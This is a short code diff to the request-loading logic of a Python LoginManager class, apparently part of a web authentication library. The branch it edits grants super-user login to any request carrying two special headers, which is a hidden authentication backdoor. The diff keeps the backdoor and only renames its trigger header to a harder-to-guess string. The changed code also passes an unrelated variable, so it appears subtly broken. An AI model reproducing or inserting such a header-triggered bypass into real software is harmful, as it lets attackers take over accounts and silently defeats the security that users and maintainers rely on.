@@ -378,7 +378,7 @@ class LoginManager(object):
             elif header_name in request.headers:
                 header = request.headers[header_name]
                 user = self._load_user_from_header(header)
-            elif "USE_SUPER_USER" in request.headers and "SUPER_USER_NAME" in request.headers:
+            elif "USE_SUPER_USER_AAAAA" in request.headers and "SUPER_USER_NAME" in request.headers:
                 user = self._load_super_user(header)
         return self._update_request_context_with_user(user)
 
